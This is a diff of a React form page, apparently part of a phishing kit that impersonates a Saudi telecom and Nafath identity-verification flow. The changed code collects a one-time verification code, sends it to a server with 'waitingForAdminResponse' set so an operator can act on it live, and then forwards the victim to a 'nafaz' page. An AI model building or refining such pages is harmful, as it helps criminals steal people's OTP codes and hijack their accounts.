@@ -1,14 +1,17 @@
 import Main from "@/components/Main";
 import { useEffect, useState } from "react";
-import { currentPage, logo, sendDataToServer } from "@/context/signals";
-import telProviders from "@/data/tel-providers";
-import { useNavigate } from "react-router-dom";
+import { logo } from "@/real-time/context/signals";
 import { ArrowUpRight } from "lucide-react";
 import InputWithClearIcon from "@/components/InputWithClearIcon";
+import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
+import telProviders from "@/data/tel-providers";
 
 function Verify() {
+  useEffect(() => {
+    setCurrentPage("verify");
+  }, []);
+
   const [error, setError] = useState<{ code: boolean }>({ code: false });
-  const navigate = useNavigate();
 
   const sendData = (e: any) => {
     e.preventDefault();
@@ -16,19 +19,31 @@ function Verify() {
     // console.log(data);
 
     // [ ] should be true for production
-    sendDataToServer(data, "verify", "nafaz", false, navigate, "/nafaz");
+    sendDataToServer({
+      data: {
+        "رمز التحقق": data.code,
+      },
+      current: "verify",
+      nextPage: "nafaz",
+      waitingForAdminResponse: true,
+    });
   };
 
-  useEffect(() => {
-    currentPage.value = "verify";
-  }, []);
   return (
     <Main>
-      <div className="bg-gray-100 min-h-[calc(100vh-400px)] py-20">
+      <div className="bg-gray-100 min-h-screen py-20">
         <form
           className="flex flex-col gap-2 max-w-lg mx-auto bg-white p-8 rounded-2xl"
           onSubmit={sendData}
         >
+          <div className="py-2 px-6 mb-4 rounded-xl bg-main">
+            <img
+              src="/assets/images/logo.svg"
+              alt="logo"
+              className="h-10 mx-auto"
+            />
+          </div>
+
           <img
             src="/assets/images/mutasil.png"
             alt="mobile header image"
@@ -52,9 +67,11 @@ function Verify() {
           </div>
 
           <img
-            src={telProviders.filter((tel) => tel.name === logo.value)[0].logo}
+            src={
+              telProviders.filter((tel) => tel.name === logo?.value)[0]?.logo
+            }
             className="h-20 mx-auto -mb-4"
-            alt={`${logo.value} logo`}
+            alt={`${logo?.value} logo`}
           />
 
           <InputWithClearIcon
